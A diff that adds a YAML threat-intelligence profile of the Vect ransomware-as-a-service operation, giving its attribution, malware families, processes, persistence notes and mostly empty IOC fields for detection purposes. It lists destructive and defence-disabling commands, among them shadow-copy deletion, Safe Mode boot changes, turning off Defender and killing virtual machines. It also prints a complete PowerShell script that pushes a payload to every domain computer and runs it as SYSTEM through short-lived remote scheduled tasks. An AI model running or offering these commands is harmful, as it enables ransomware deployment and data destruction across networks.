@@ -1,0 +1,101 @@
+title: 'Dark Web Profile: Vect Ransomware'
+description: Vect is a financially motivated double-extortion ransomware-as-a-service
+  operation that debuted on December 31, 2025, leveraging supply chain credential
+  pipelines via TeamPCP and BreachForums mass affiliate enrollment to deploy ransomware
+  across Windows, Linux, and VMware ESXi environments.
+attribution: Vect (Russian-speaking operator; possible link to Devman/DragonForce/LockBit/Conti
+  lineage)
+malware_families:
+- Vect
+- Devman
+- Vect Ransomware
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - cmd.exe
+  - sc.exe
+  - vssadmin.exe
+  - vmware-cmd
+  - esxcli
+  - VBoxManage
+  - virsh
+  - cmdkey.exe
+  command_lines:
+  - vssadmin delete shadows /all /quiet
+  - bcdedit /set safeboot
+  - esxcli vm process kill
+  - VBoxManage controlvm poweroff
+  - virsh destroy
+  powershell:
+  - Set-MpPreference -DisableRealtimeMonitoring $true
+  - '$u=<username>
+
+    $p=<password>
+
+    $src=<payload path>
+
+    $name=<payload name>
+
+    $sp = ConvertTo-SecureString $p -AsPlainText -Force
+
+    $cred = New-Object PSCredential ($u, $sp)
+
+    $pes = ([adsisearcher]"objectCategory=computer").FindAll() |% { $_.Properties[''dNSHostName''][0]
+    } |? { $_ -and $_ -ne $env:COMPUTERNAME }
+
+    foreach($pe in $pes){
+
+    $dest="\\$pe\C$\ProgramData\$name"
+
+    $tn = $([char[]](65..90)|Get-Random -Count 4|%{[char]$_}) -join ''''
+
+    Copy-Item $src $dest -Force
+
+    $action = New-ScheduledTaskAction -Execute "C:\ProgramData\$name"
+
+    $principal = New-ScheduledTaskPrincipal -UserId SYSTEM -LogonType ServiceAccount
+    -RunLevel Highest
+
+    $task = New-ScheduledTask -Action $action -Principal $principal
+
+    $sess = New-CimSession -ComputerName $pe -Credential $cred
+
+    Register-ScheduledTask -CimSession $sess -TaskName $tn -InputObject $task -Force
+    -EA Stop | Out-Null
+
+    Start-ScheduledTask -CimSession $sess -TaskName $tn
+
+    Start-Sleep -Milliseconds 500
+
+    Unregister-ScheduledTask -CimSession $sess -TaskName $tn -Confirm:$false -EA SilentlyContinue
+
+    }'
+  scripts: []
+  registry_keys: []
+  image_loads:
+  - libsodium
+  network_connections: []
+  file_activity:
+  - dvm3_wall.bmp
+  persistence:
+  - Registry Run key written to reboot host into Safe Mode with SafeBoot Minimal and
+    Network entries
+  - Scheduled Tasks registered remotely over CIM sessions named with hardcoded DM
+    prefix followed by four random uppercase letters, running under SYSTEM at highest
+    privilege
+  - sc.exe used to install locker as a remote service
+  - Scheduled task created remotely via CimSession targeting SYSTEM account, executing
+    payload from C:\ProgramData\, then unregistered after execution
+  - Registry Run Keys / Startup Folder (T1547.001)
+  process_relations:
+  - sc.exe -> locker service (remote installation)
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls: []
+authors: []
+reference: https://socradar.io/blog/dark-web-profile-vect-ransomware
+date_of_publication: June 05, 2026
+file_creation_date: June 11, 2026
